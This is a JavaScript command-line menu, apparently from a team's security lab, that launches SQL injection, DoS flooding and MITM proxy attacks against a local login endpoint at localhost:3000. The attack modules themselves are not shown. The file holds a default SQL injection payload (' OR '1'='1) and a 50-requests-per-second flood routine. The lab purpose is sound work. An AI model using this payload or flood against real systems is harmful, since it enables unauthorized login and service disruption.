import readline from 'readline';
import { runSqlInjectionAttack } from './attacks/sqli.attack.js';
import { startDosAttack } from './attacks/dos.attack.js';
import { toggleMitmAttack } from './attacks/mitm.attack.js';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log('=== ATTACKER CONTROLLER CLI (THÀNH VIÊN 2) ===');
console.log('1. Bắn SQL Injection (POST /attack/sqli)');
console.log('2. Bắn DoS 50 req/s (POST /attack/dos)');
console.log('3. Bật/tắt nghe lén MITM Proxy (POST /attack/mitm)');
console.log('4. Thoát');

function promptUser() {
  rl.question('\nChọn kịch bản tấn công (1-4): ', async (choice) => {
    switch (choice.trim()) {
      case '1':
        rl.question("Nhập payload (Mặc định: ' OR '1'='1): ", async (payload) => {
          await runSqlInjectionAttack('http://localhost:3000/api/login', payload.trim() || undefined);
          promptUser();
        });
        break;
      case '2':
        console.log('Đang kích hoạt DoS 50 req/s vào http://localhost:3000/api/login trong 10 giây...');
        await startDosAttack('http://localhost:3000/api/login', 50, 10);
        promptUser();
        break;
      case '3':
        rl.question('Bật (1) hay Tắt (0) MITM Proxy? ', async (ans) => {
          await toggleMitmAttack(ans.trim() === '1');
          promptUser();
        });
        break;
      case '4':
        rl.close();
        process.exit(0);
      default:
        console.log('Lựa chọn không hợp lệ');
        promptUser();
        break;
    }
  });
}

promptUser();
